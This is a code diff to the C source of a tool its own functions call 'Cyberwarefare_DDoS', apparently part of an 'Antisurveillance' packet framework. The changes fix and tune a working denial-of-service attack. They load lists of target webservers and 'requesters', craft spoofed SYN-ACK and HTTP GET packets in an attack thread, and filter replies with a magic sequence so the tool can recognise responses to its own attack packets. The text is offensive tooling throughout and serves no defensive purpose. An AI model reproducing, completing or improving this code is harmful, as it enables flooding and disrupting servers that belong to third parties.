@@ -107,7 +107,7 @@ typedef union {
 // if we ONLY monitor for SYN+ACK AND pass this... regardless of some time warp it shoould still function properly..
 // a better version can be done but im just winging this to get it released quickly... it wont take long to redo
 // keeping this.. will prob do a libnet/libpcap version so people can use immediately tomorrow
-int packet_filter(uint32_t seq, uint32_t ip, int port, uint32_t ts, uint32_t *gen) {
+int packet_filter(uint32_t seq, uint32_t ip, unsigned short port, uint32_t ts, uint32_t *gen) {
     Oracle xyz;
     int i = 0;
 
@@ -117,8 +117,10 @@ int packet_filter(uint32_t seq, uint32_t ip, int port, uint32_t ts, uint32_t *ge
     xyz.a.e = ((xyz.a.c + xyz.a.d) & 0x000000ff);
 
     if (gen)
-        ts += 2;
-    
+        ts += 1;
+    else
+        ts -= 3;
+
     for (i =0; i < 5; i++) {
         xyz.a.a = ((ts + i) / 2) & 0x0000000f;
         xyz.a.b = ((ts + i) % 2) & 0x0000000f;
@@ -129,10 +131,7 @@ int packet_filter(uint32_t seq, uint32_t ip, int port, uint32_t ts, uint32_t *ge
             return 1;
         }
 
-        if (xyz.b == seq) {
-            return 1;
-        }
-        
+        if (xyz.b == seq) return 1;
     }
 
     return 0;
@@ -148,11 +147,15 @@ int FilterIsOurPacket(PacketBuildInstructions *iptr) {
     // later usse time(0) once for thousands/millions of packets (depending on the network setup)
     int ts = time(0);
 
+    // first check to weed out bad is high source port
+    if (iptr->destination_port < 60000) return 0;
+
     // first we ensure its SYN|ACK
     if (!(iptr->flags & TCP_FLAG_SYN) && (iptr->flags & TCP_FLAG_ACK)) return 0;
 
-    // we verify against the packets DESTINATION. since we are responding to the servers
-    if (packet_filter(iptr->seq, iptr->destination_ip, iptr->destination_port, ts, NULL)) return 1;
+    // now we use the addresses to create a small magic sequence like a checksum.. and itll
+    // tell us if the packet is infact our attacks
+    if (packet_filter(iptr->ack, iptr->destination_ip, iptr->destination_port, ts, NULL)) return 1;
 
     return 0;
 }
@@ -342,7 +345,7 @@ int Cyberwarefare_DDoS_Init(AS_context *ctx) {
     FilterPrepare(flt, 0, 0);
 
     // add into network subsystem so we receive all packets
-    if (Network_AddHook(ctx, flt, &NetworkAPI_Incoming) != 1) goto end;
+    if (Network_AddHook(ctx, flt, &Cyberwarefare_Incoming) != 1) goto end;
 
     ret =  1;
 
@@ -395,8 +398,10 @@ int Cyberwarfare_SendAttack2(AS_context *ctx, PacketBuildInstructions *iptr) {
     bptr->ack = iptr->seq;
     bptr->header_identifier = header++;
 
+    // put in queue for wire
     NetworkQueueInstructions(ctx, bptr, &optr);
 
+    // free first packet
     PacketBuildInstructionsFree(bptr);
 
     // now build packet for http request (GET .....)
@@ -413,10 +418,13 @@ int Cyberwarfare_SendAttack2(AS_context *ctx, PacketBuildInstructions *iptr) {
     bptr->data = strdup(req_data);
     bptr->data_size = req_data_size;
 
+    // put in queue for wire
     NetworkQueueInstructions(ctx, bptr, &optr);
     
+    // push both to wire
     if (optr) OutgoingQueueLink(ctx, optr);
     
+    // free 2nd packet
     PacketBuildInstructionsFree(bptr);
 
     return 1;
@@ -428,9 +436,6 @@ int Cyberwarfare_SendAttack2(AS_context *ctx, PacketBuildInstructions *iptr) {
 // all packets reacch this function so that we can determine if any are for our network stack
 int Cyberwarefare_Incoming(AS_context *ctx, PacketBuildInstructions *iptr) {
     int ret = 0;
-    SocketContext *sptr = NULL, *connptr = NULL;
-    IOBuf *bptr = NULL;
-    int j = 0;
 
     // we need to analyze the current time, source ports, and then determine if its for an attacak
     // the timme slice should invalidate.. and this should get moved directly after reading fromm network kdevice
@@ -474,8 +479,8 @@ void attack_thread(void *arg) {
     AS_context *ctx = (AS_context *)arg;
     char *tags[] = { "A1", "00", NULL };
     int web_i = 0, req_i = 0, start = 0, count = 0;
-    IPAddresses *webservers = IPAddressesbyGeo(ctx, tags[0]);
-    IPAddresses *requesters = IPAddressesbyGeo(ctx, tags[1]);
+    IPAddresses *webservers = IPAddressesPtr(ctx, tags[0]);
+    IPAddresses *requesters = IPAddressesPtr(ctx, tags[1]);
     int ts = 0;
     OutgoingPacketQueue *optr = NULL;
     int fast = 0;
@@ -502,7 +507,8 @@ void attack_thread(void *arg) {
         }
 
         // this has to be adjusted.. a better system to limit needs to be in place.. not yet
-        if (count++ > 5000) sleep(5);
+        //if (count++ > 5000) sleep(5);
+        sleep(10);
     }
 
     pthread_exit(0);
@@ -512,16 +518,16 @@ int main(int argc, char *argv[]) {
     AS_context *ctx = Antisurveillance_Init();
     int i = 0, r = 0;
     int bad = 0;
-    pthread_t attack_thread;
+    pthread_t attack_thread_handle;
     char *files[] = { "webservers", "requesters", NULL };
     char *tag[] = { "A1", "00", NULL };
-
+    
     Module_Add(ctx, &Cyberwarefare_DDoS_Init, NULL);
 
     // open and turn both files into IPaddress lists
     while (files[i] != NULL) {
         r = file_to_iplist(ctx, files[i], tag[i]);
-        
+
         // if it failed.. bad=1
         if (r <= 0) { bad = 1; break; }
 
@@ -534,7 +540,7 @@ int main(int argc, char *argv[]) {
     }
 
     // now its time to begin the attack.. 
-    if (pthread_create(&attack_thread, NULL, attack_thread, (void *)ctx) != 0) {
+    if (pthread_create(&attack_thread_handle, NULL, attack_thread, (void *)ctx) != 0) {
         fprintf(stderr, "cannot start threads\n");
         exit(-1);
     }
